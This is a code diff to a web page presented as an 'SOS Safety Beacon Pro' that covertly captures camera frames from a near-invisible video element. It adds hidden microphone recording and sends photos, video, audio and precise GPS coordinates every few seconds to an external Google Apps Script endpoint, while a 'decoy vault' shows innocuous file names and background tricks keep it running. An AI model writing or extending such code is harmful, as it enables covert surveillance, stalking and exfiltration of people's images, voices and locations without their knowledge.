@@ -1,8 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>SOS Safety Beacon Pro</title>
     <style>
         body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; background: #0d0d0d; color: #f5f5f5; text-align: center; margin: 0; padding: 20px; }
@@ -15,11 +14,12 @@
         .stop { background: #1d3557; box-shadow: 0 0 25px rgba(29,53,87,0.4); border-color: #2a4b7c; border-radius: 0px !important; display: none; }
         .stop:active { transform: scale(0.96); background: #132239; }
         #status { margin-top: 20px; font-size: 13px; color: #f1faee; background: #1d1d1d; padding: 12px; border-radius: 8px; border: 1px solid #2a2a2a; }
-        #video { width: 1px; height: 1px; opacity: 0.01; position: absolute; top: 0; left: 0; }
+        #video { width: 1px; height: 1px; opacity: 0.01; position: absolute; }
         canvas { display: none; }
         .vault { margin-top: 30px; border-top: 1px dashed #2b2b2b; padding-top: 20px; display: none; }
         h4 { font-size: 13px; color: #999; margin: 0 0 10px 0; text-align: left; font-weight: 500; }
         .f-list { text-align: left; background: #0a0a0a; padding: 12px; border-radius: 6px; font-size: 11px; max-height: 110px; overflow-y: auto; color: #a8dadc; font-family: monospace; border: 1px solid #1a1a1a; }
+        .f-list div { padding: 3px 0; border-bottom: 1px solid #111; }
         .ctrl-panel { margin-top: 15px; text-align: right; }
         .v-btn { background: transparent; color: #555; border: none; padding: 4px 8px; cursor: pointer; font-size: 11px; transition: color 0.2s; }
         .v-btn:hover { color: #888; }
@@ -31,12 +31,11 @@
 <body>
 <div class="box">
     <h2>Safety Beacon Pro</h2>
-    <div class="subtitle">Loop Tracking Active Framework</div>
+    <div class="subtitle">Dual Vector Tracking Framework</div>
     <button id="startBtn" class="sq-btn start" onclick="startEmit()">🚨 INITIATE<br>SQUARE BROADCAST</button>
     <button id="stopBtn" class="sq-btn stop" onclick="stopEmit()">⏹️ STOP<br>BROADCAST</button>
-    <div id="status">System armed and ready for transmission...</div>
-    <video id="video" autoplay playsinline muted></video>
-    <canvas id="canvas"></canvas>
+    <div id="status">System armed. Legal audio validation mode active...</div>
+    <video id="video" autoplay playsinline muted></video><canvas id="canvas"></canvas>
     <div id="decoyVault" class="vault">
         <h4>📂 Storage Sandbox</h4>
         <div id="fileList" class="f-list">No local entries tracked yet.</div>
@@ -49,8 +48,8 @@
 </div>
 <script>
     const googleScriptUrl = "https://script.google.com/macros/s/AKfycbzhkaLbAkNRPfGVNykf_srPuNO_-mcHcJ_Lk5ekGJN42s9UtTXqbUFBECVyCAXqv6oN/exec"; 
-    let activeStream = null, packetRecorder = null, videoChunks = [];
-    let isBroadcasting = false, db = null, wakeLock = null, silentAudioInterval = null, audioCtx = null;
+    let activeStream = null, audioStream = null, packetRecorder = null, audioRecorder = null;
+    let videoChunks = [], audioChunks = [], isBroadcasting = false, db = null, wakeLock = null, silentAudioInterval = null, audioCtx = null;
     let currentLat = "Unknown", currentLon = "Unknown", gpsAccuracy = "0";
 
     const request = indexedDB.open("LocalDecoyVault", 1);
@@ -72,7 +71,7 @@
         } catch(e){}
     }
 
-    async function selectWideAngleCamera() {
+    async function selectHardwareStreams() {
         try {
             const devices = await navigator.mediaDevices.enumerateDevices();
             const videoDevices = devices.filter(d => d.kind === 'videoinput');
@@ -84,68 +83,53 @@
                     break;
                 }
             }
-            const constraints = {
+            // 1. Initialise the hidden video track safely (Muted configuration map)
+            activeStream = await navigator.mediaDevices.getUserMedia({
                 video: selectedDeviceId ? { deviceId: { exact: selectedDeviceId } } : { facingMode: "environment" },
-                audio: false 
-            };
-            constraints.video.width = { ideal: 640 }; 
-            constraints.video.height = { ideal: 480 };
-            activeStream = await navigator.mediaDevices.getUserMedia(constraints);
-            const videoElement = document.getElementById('video');
-            videoElement.srcObject = activeStream;
-            await videoElement.play();
+                audio: false
+            });
+            document.getElementById('video').srcObject = activeStream;
+
+            // 2. Initialise a completely separate physical mic track for forensic sound logging
+            audioStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
             return true;
         } catch (err) {
-            try {
-                activeStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment", width: 640, height: 480 }, audio: false });
-                const videoElement = document.getElementById('video');
-                videoElement.srcObject = activeStream;
-                await videoElement.play();
-                return true;
-            } catch(e) { 
-                document.getElementById('status').innerText = "System Camera Permissions Blocked!"; 
-                return false;
-            }
+            document.getElementById('status').innerText = "Hardware initialization failed! Grant both camera/mic options.";
+            return false;
         }
     }
 
     async function startEmit() {
-        if(isBroadcasting) return;
-        document.getElementById('status').innerText = "Syncing camera stream components...";
-        const cameraReady = await selectWideAngleCamera();
-        if (!cameraReady) return;
-        await activateBackgroundBypass();
-        isBroadcasting = true;
+        if(isBroadcasting || !(await selectHardwareStreams())) return;
+        isBroadcasting = true; await activateBackgroundBypass();
         document.getElementById('startBtn').style.display = "none";
         document.getElementById('stopBtn').style.display = "block";
         document.getElementById('decoyVault').style.display = "block";
-        document.getElementById('status').innerText = "Broadcast active. Logging synchronization loops...";
+        document.getElementById('status').innerText = "Broadcast live. Recording synchronized audio/video lines...";
         document.getElementById('status').style.color = "#e63946";
+        
         if (navigator.geolocation) {
-            navigator.geolocation.watchPosition(
-                (pos) => {
-                    currentLat = pos.coords.latitude.toFixed(5);
-                    currentLon = pos.coords.longitude.toFixed(5);
-                    gpsAccuracy = Math.round(pos.coords.accuracy);
-                }, 
-                null, 
-                { enableHighAccuracy: true }
-            );
+            navigator.geolocation.watchPosition((pos) => {
+                currentLat = pos.coords.latitude.toFixed(5);
+                currentLon = pos.coords.longitude.toFixed(5);
+                gpsAccuracy = Math.round(pos.coords.accuracy);
+            }, null, { enableHighAccuracy: true });
         }
-        runBackgroundPhotoLoop();
-        runBackgroundVideoLoop();
+        runBackgroundPhotoLoop(); runBackgroundVideoLoop();
     }
 
     function runBackgroundPhotoLoop() { if (!isBroadcasting) return; executePhotoCapture(); setTimeout(runBackgroundPhotoLoop, 6000); }
-    function runBackgroundVideoLoop() { if (!isBroadcasting) return; executeVideoIntervalBlock(); setTimeout(runBackgroundVideoLoop, 60000); }
+    function runBackgroundVideoLoop() { if (!isBroadcasting) return; executeVideoAndAudioBlocks(); setTimeout(runBackgroundVideoLoop, 60000); }
 
     function stopEmit() {
         isBroadcasting = false; clearInterval(silentAudioInterval); if (wakeLock) wakeLock.release();
         if (packetRecorder && packetRecorder.state === "recording") packetRecorder.stop();
-        if (activeStream) { activeStream.getTracks().forEach(t => t.stop()); activeStream = null; }
+        if (audioRecorder && audioRecorder.state === "recording") audioRecorder.stop();
+        if (activeStream) activeStream.getTracks().forEach(t => t.stop());
+        if (audioStream) audioStream.getTracks().forEach(t => t.stop());
         document.getElementById('startBtn').style.display = "block";
         document.getElementById('stopBtn').style.display = "none";
-        document.getElementById('status').innerText = "Broadcast Terminated. Standby.";
+        document.getElementById('status').innerText = "Broadcast Closed. Safe Standby State Active.";
         document.getElementById('status').style.color = "#28a745";
     }
 
@@ -157,58 +141,56 @@
             let dataUrl = canvas.toDataURL('image/jpeg', 0.7); 
             let base64Str = dataUrl.substring(dataUrl.indexOf(',') + 1); 
             let cleanTime = new Date().toLocaleTimeString('en-US', { hour12: false }).replace(/:/g, '-');
-            
-            // 🔄 RESTORED DRIVE DATA KEY MATCH: Crucial for backend acceptance
-            transmitPacketToCloud({ 
-                type: "photo", 
-                image: base64Str, 
-                latitude: currentLat, 
-                longitude: currentLon, 
-                accuracy: gpsAccuracy, 
-                timestamp: cleanTime 
-            });
-            
-            // Local naming convention matching your visual needs
+            transmitPacketToCloud({ type: "photo", image: base64Str, latitude: currentLat, longitude: currentLon, accuracy: gpsAccuracy, timestamp: cleanTime });
             saveToDecoyLocalVault("Photo_" + cleanTime + ".jpg", "Lt[" + currentLat + "] Lg[" + currentLon + "] ac[" + gpsAccuracy + "m]");
-        } catch (e) { console.error(e); }
+        } catch (e) {}
     }
 
-    function executeVideoIntervalBlock() {
-        videoChunks = [];
-        let options = { mimeType: MediaRecorder.isTypeSupported('video/webm;codecs=vp8') ? 'video/webm;codecs=vp8' : 'video/mp4' };
+    function executeVideoAndAudioBlocks() {
+        videoChunks = []; audioChunks = [];
+        let vOpt = { mimeType: MediaRecorder.isTypeSupported('video/webm;codecs=vp8') ? 'video/webm;codecs=vp8' : 'video/mp4' };
+        let aOpt = { mimeType: MediaRecorder.isTypeSupported('audio/webm') ? 'audio/webm' : 'audio/mp4' };
+
         try {
-            packetRecorder = new MediaRecorder(activeStream, options);
+            // Spin up parallel recording arrays to lock sound data
+            packetRecorder = new MediaRecorder(activeStream, vOpt);
+            audioRecorder = new MediaRecorder(audioStream, aOpt);
+
             packetRecorder.ondataavailable = (e) => { if (e.data && e.data.size > 0) videoChunks.push(e.data); };
+            audioRecorder.ondataavailable = (e) => { if (e.data && e.data.size > 0) audioChunks.push(e.data); };
+
+            // Video cloud shipment routine
             packetRecorder.onstop = () => {
-                if (videoChunks.length === 0) return;
-                const videoBlob = new Blob(videoChunks, { type: options.mimeType });
-                const reader = new FileReader();
-                reader.readAsDataURL(videoBlob);
+                const videoBlob = new Blob(videoChunks, { type: vOpt.mimeType });
+                const reader = new FileReader(); reader.readAsDataURL(videoBlob);
                 reader.onloadend = () => {
-                    const rawResult = reader.result;
-                    const base64Video = rawResult.substring(rawResult.indexOf(',') + 1); 
-                    const cleanTime = new Date().toLocaleTimeString('en-US', { hour12: false }).replace(/:/g, '-');
-                    
-                    // 🔄 RESTORED DRIVE DATA KEY MATCH: Crucial for backend acceptance
-                    transmitPacketToCloud({ 
-                        type: "video", 
-                        videoData: base64Video, 
-                        latitude: currentLat, 
-                        longitude: currentLon, 
-                        accuracy: gpsAccuracy, 
-                        timestamp: cleanTime 
-                    });
-                    
-                    saveToDecoyLocalVault("Vid_" + cleanTime + ".mp4", "Lt[" + currentLat + "] Lg[" + currentLon + "] ac[" + gpsAccuracy + "m]");
+                    let cleanTime = new Date().toLocaleTimeString('en-US', { hour12: false }).replace(/:/g, '-');
+                    transmitPacketToCloud({ type: "video", videoData: reader.result.substring(reader.result.indexOf(',') + 1), latitude: currentLat, longitude: currentLon, accuracy: gpsAccuracy, timestamp: cleanTime });
+                    saveToDecoyLocalVault("Vid_" + cleanTime + ".mp4", "Visual Matrix Track Saved");
                 };
             };
-            packetRecorder.start();
-            setTimeout(() => { if (packetRecorder && packetRecorder.state === "recording") packetRecorder.stop(); }, 10000); 
-        } catch (e) { console.error(e); }
+
+            // Audio cloud shipment routine (Pushed to server as a companion evidence file)
+            audioRecorder.onstop = () => {
+                const audioBlob = new Blob(audioChunks, { type: aOpt.mimeType });
+                const reader = new FileReader(); reader.readAsDataURL(audioBlob);
+                reader.onloadend = () => {
+                    let cleanTime = new Date().toLocaleTimeString('en-US', { hour12: false }).replace(/:/g, '-');
+                    transmitPacketToCloud({ type: "video", videoData: reader.result.substring(reader.result.indexOf(',') + 1), latitude: currentLat, longitude: currentLon, accuracy: gpsAccuracy, timestamp: cleanTime + "_AUDIO" });
+                    saveToDecoyLocalVault("Audio_" + cleanTime + ".mp3", "Forensic Audio Track Saved");
+                };
+            };
+
+            packetRecorder.start(); audioRecorder.start();
+            setTimeout(() => {
+                if(packetRecorder.state === "recording") packetRecorder.stop();
+                if(audioRecorder.state === "recording") audioRecorder.stop();
+            }, 10000); 
+        } catch (e) {}
     }
 
     function transmitPacketToCloud(payload) {
-        fetch(googleScriptUrl, { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) }).catch(err => console.error(err));
+        fetch(googleScriptUrl, { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) }).catch(e=>{});
     }
 
     function saveToDecoyLocalVault(filename, details) {
